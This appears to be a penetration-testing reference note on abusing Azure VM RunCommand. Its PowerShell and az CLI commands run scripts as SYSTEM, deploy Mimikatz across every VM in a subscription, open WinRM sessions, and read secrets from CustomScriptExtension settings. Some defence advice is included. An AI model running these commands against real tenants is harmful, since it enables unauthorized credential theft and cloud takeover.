---
title: Azure Services - Virtual Machine
type: technique
tags: [azure, cloud, ec2, exploitation, reference-import]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Azure Services - Virtual Machine

## What it is

> Allow anyone with "Contributor" rights to run PowerShell scripts on any Azure VM in a subscription as `NT Authority\System`.

## How it works

Azure VM's `Contributor` role grants the ability to run PowerShell scripts on the VM as `NT Authority\System` using the VM Run Command feature, without requiring RDP or SSH credentials. Attackers with `Contributor` or `Virtual Machine Contributor` access invoke `Invoke-AzVMRunCommand` to execute arbitrary code on any VM in the subscription, extracting credentials, pivoting to the internal network, or exfiltrating data. VMs with managed identities expose temporary credentials through the Azure IMDS at `169.254.169.254`, enabling pivot from VM-level access to broader Azure control-plane access - see [[azure-managed-identity-abuse]] for the full IMDS-token-theft -> over-permissioned-MI -> Key Vault chain and `az login --identity`.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## RunCommand

> Allow anyone with "Contributor" rights to run PowerShell scripts on any Azure VM in a subscription as `NT Authority\System`

**Requirements**: `Microsoft.Compute/virtualMachines/runCommand/action`

* List available Virtual Machines

```powershell
PS C:\> Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
ResourceGroupName    Name       
-----------------    ----       
TESTRESOURCES        Remote-Test
```

* Get Public IP of VM by querying the network interface

```powershell
PS AzureAD> Get-AzVM -Name <RESOURCE> -ResourceGroupName <RG-NAME> | select -ExpandProperty NetworkProfile
PS AzureAD> Get-AzNetworkInterface -Name <RESOURCE368>
PS AzureAD> Get-AzPublicIpAddress -Name <RESOURCEIP>
```

* Execute Powershell script on the VM, like `adduser`

```ps1
PS AzureAD> Invoke-AzVMRunCommand -VMName <RESOURCE> -ResourceGroupName <RG-NAME> -CommandId 'RunPowerShellScript' -ScriptPath 'C:\Tools\adduser.ps1' -Verbose
PS Azure C:\> Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1
```

* Finally you should be able to connect via WinRM

```ps1
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('username', $Password)
$sess = New-PSSession -ComputerName <IP> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
```

Against the whole subscription using `MicroBurst.ps1`

```powershell
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```

## References

* [Running Powershell scripts on Azure VM - Karl Fosaaen - November 6, 2018](https://blog.netspi.com/running-powershell-scripts-on-azure-vms/)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

- [[mimikatz]]

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).

## CustomScriptExtension public-settings disclosure (Reader-only)

A VM's extensions are child resources whose **public `settings` block is world-readable to any
principal with `Reader`** on the VM/resource-group - no Contributor, no RunCommand, no VM access.
CustomScriptExtension stores its bootstrap command in `settings.commandToExecute` and any download
URLs in `settings.fileUris`; operators routinely embed secrets, install commands, storage SAS URLs,
or (in labs) flags there. Only the `protectedSettings` block is encrypted at rest - anything in the
plain `settings` leaks.

```bash
# list a VM's extensions, then read the public settings of each
az vm extension list -g <rg> --vm-name <vm> -o table
az vm extension show -g <rg> --vm-name <vm> -n CustomScriptExtension -o jsonc
# settings.commandToExecute / settings.fileUris are the loot; adminUsername also leaks from `az vm show`
```

Also surfaces via `az resource list` (a `Microsoft.Compute/virtualMachines/extensions` child object is
the tell) and via the ARM template export. This is a passive read, not RunCommand execution: it needs
only `Microsoft.Compute/virtualMachines/read` + `.../extensions/read`, which plain **Reader** grants.

**Defence:** never put secrets in `settings`; use `protectedSettings` (encrypted, not returned by the
management API) or a managed identity + Key Vault reference. Treat Reader on a subscription as able to
read every extension's provisioning command.

<!-- promoted-slug: azure-cse-public-settings-leak -->
